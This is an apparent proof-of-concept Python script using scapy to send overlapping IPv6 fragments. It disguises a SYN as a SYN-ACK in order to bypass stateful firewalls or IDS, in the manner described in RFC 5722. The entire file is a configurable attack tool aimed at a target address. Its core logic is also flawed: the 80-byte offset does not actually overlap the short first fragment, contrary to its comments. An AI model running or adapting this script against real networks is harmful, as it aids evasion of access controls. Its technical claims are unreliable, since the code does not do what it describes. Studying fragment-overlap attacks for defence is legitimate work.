#!/usr/bin/env python3
"""
Proof-of-Concept: IPv6 Overlapping Fragment Reassembly Race (RFC 5722)

This script demonstrates how an attacker can bypass a stateful firewall or
IDS that inspects fragments before full reassembly. By sending a first
fragment with a benign TCP header (e.g., SYN-ACK) and a second overlapping
fragment with a malicious TCP header (e.g., SYN), the attacker can exploit
a race condition or lack of overlap detection to inject a connection request
that appears to be a response.

References:
- RFC 5722: Handling of Overlapping IPv6 Fragments
- RFC 8200: IPv6 Specification (Section 4.5)
"""

import sys
import random
import time
from scapy.all import (
    IPv6, Fragment, TCP, IP, send, RandShort, RandInt, conf
)

# Configuration
TARGET_IPV6 = "2001:db8::1"  # Replace with target IPv6 address
SRC_IPV6 = "2001:db8::2"     # Replace with attacker IPv6 address
SRC_PORT = RandShort()
DST_PORT = 80

# Shared Fragment Identification (RFC 8200 Section 4.5)
FRAG_ID = RandInt()

def craft_first_fragment():
    """
    Step 1: Craft the first fragment.
    
    According to RFC 5722, the first fragment contains the unfragmentable
    headers and the beginning of the fragmentable part. We include a TCP
    header with SYN-ACK flags to trick a stateful firewall into thinking
    this is a legitimate response to an internal connection request.
    
    Fragment Offset = 0 (First fragment)
    M flag = 1 (More fragments follow)
    """
    # TCP Header with SYN-ACK flags (Benign-looking to firewall)
    tcp_synack = TCP(
        sport=SRC_PORT,
        dport=DST_PORT,
        flags="SA",  # SYN + ACK
        seq=RandInt(),
        ack=RandInt()
    )

    # Fragment Header
    frag_header = Fragment(
        ident=FRAG_ID,
        offset=0,       # First fragment
        more=1          # More fragments follow
    )

    # IPv6 Header
    ipv6_header = IPv6(
        src=SRC_IPV6,
        dst=TARGET_IPV6
    )

    # Assemble the first fragment packet
    first_frag = ipv6_header / frag_header / tcp_synack
    return first_frag

def craft_second_fragment():
    """
    Step 2: Craft the second overlapping fragment.
    
    This fragment overlaps with the first fragment's TCP header region.
    By setting the Fragment Offset to 10 (80 bytes), we start exactly
    where the TCP header begins in the first fragment (assuming 80 bytes
    of extension headers or padding, as per RFC 5722 Figure 3/4).
    
    We inject a malicious TCP header with SYN flag only, attempting to
    initiate a connection instead of responding.
    
    Fragment Offset = 10 (Overlaps with first fragment)
    M flag = 0 (Last fragment)
    """
    # TCP Header with SYN flag (Malicious payload)
    tcp_syn = TCP(
        sport=SRC_PORT,
        dport=DST_PORT,
        flags="S",  # SYN only
        seq=RandInt(),
        ack=0
    )

    # Fragment Header
    # Offset is in 8-octet units. Offset=10 means 80 bytes into the payload.
    # This overlaps the TCP header from the first fragment.
    frag_header = Fragment(
        ident=FRAG_ID,
        offset=10,     # Overlapping offset
        more=0         # Last fragment
    )

    # IPv6 Header
    ipv6_header = IPv6(
        src=SRC_IPV6,
        dst=TARGET_IPV6
    )

    # Assemble the second fragment packet
    second_frag = ipv6_header / frag_header / tcp_syn
    return second_frag

def main():
    print(f"[*] Target: {TARGET_IPV6}")
    print(f"[*] Source: {SRC_IPV6}")
    print(f"[*] Fragment ID: {FRAG_ID}")
    print("[*] Crafting overlapping IPv6 fragments...")

    first_frag = craft_first_fragment()
    second_frag = craft_second_fragment()

    print("[+] Sending First Fragment (SYN-ACK)...")
    send(first_frag, verbose=False)
    
    # Small delay to simulate race condition or allow firewall to process first fragment
    time.sleep(0.1)
    
    print("[+] Sending Second Fragment (SYN - Overlapping)...")
    send(second_frag, verbose=False)

    print("[*] Attack sequence complete.")
    print("[!] If the target is vulnerable:")
    print("    - The firewall may have allowed the first fragment (SYN-ACK).")
    print("    - The overlapping second fragment (SYN) may overwrite the header.")
    print("    - The reassembled packet will be treated as a SYN request, bypassing access controls.")
    print("[!] If the target is patched (RFC 5722 compliant):")
    print("    - The overlapping fragment will be detected and discarded.")
    print("    - No connection will be established.")

if __name__ == "__main__":
    if not conf.ipv6_enabled:
        print("[!] IPv6 is not enabled on this system.")
        sys.exit(1)
    main()